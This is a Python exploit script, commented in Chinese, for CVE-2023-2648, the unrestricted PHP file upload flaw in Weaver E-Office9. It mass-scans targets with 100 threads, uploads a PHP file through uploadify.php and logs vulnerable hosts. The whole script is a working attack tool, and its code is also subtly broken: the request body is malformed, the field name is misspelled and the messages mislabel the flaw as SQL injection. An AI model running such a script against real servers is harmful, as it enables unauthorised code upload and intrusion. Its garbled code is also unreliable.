#泛微 E-Office9 文件上传漏洞
#/inc/jquery/uploadify/uploadify.php 对参数 Filedata 的操作会导致不受限制的上传 FWEO_Fup.py
# 导包
import requests,sys,argparse,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                    author:           sawa
                                    version:          1.0.0
                                    For:              泛微 E-Office9 文件上传漏洞
                                    Vulnerability ID: CVE-2023-2648
"""
    print(banner)

# poc模块
def poc(target):
    payload_url ="/inc/jquery/uploadify/uploadify.php"
    url = target+payload_url
    headers = {
        'Content-Length':'204',
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'Origin':'null',
        'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Connection':'close',
    }
    data = {
        '------WebKitFormBoundarydRVCGWq4Cx3Sq6tt'
        'Content-Disposition': 'form-data; name="Fdiledata"; filename="s.php."',
        'Content-Type': 'image/jpeg'
        
        '<?php phpinfo();?>'
        '------WebKitFormBoundarydRVCGWq4Cx3Sq6tt'
    }
    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if res.status_code == 200:
            result = res.text.strip()  # 去除前后空白字符
            if result:  # 检查 result 是否不为空
                print(f"[+]该站点存在sql注入漏洞, url: {target}/attachment/{result}/s.php")
                with open('result.txt', 'a', encoding='utf-8') as fp:
                    fp.write(target + "\n")
            else:
                print("[-]该站点不存在sql注入漏洞, url:" + target)
                with open('without-bug.txt', 'a', encoding='utf-8') as fp:
                    fp.write(target + "\n")
        else:
            print("[-]该站点不存在sql注入漏洞, url:" + target)
            with open('without-bug.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
    except Exception as e:
        print("[!]连接出现问题，请手动进行测试该站点, url=" + target + " 错误信息: " + str(e))
        with open('warning.txt', 'a', encoding='utf-8') as fp:
            fp.write(target + "\n")
# 主函数模块
def main():
    # 先调用指纹
    banner()
    # 描述信息
    parser = argparse.ArgumentParser(description="this is a 泛微 E-Office9 文件上传漏洞")
    # -u指定单个url检测， -f指定批量url进行检测
    parser.add_argument('-u','--url',dest='url',help='please input your attack-url',type=str)
    parser.add_argument('-f','--file',dest='file',help='please input your attack-url.txt',type=str)
    # 重新填写变量url，方便最后测试完成将结果写入文件内时调用
    # 调用
    args = parser.parse_args()
    # 判断输入的是单个url还是批量url，若单个不开启多线程，若多个则开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
# 主函数入口
if __name__ == "__main__":
    main()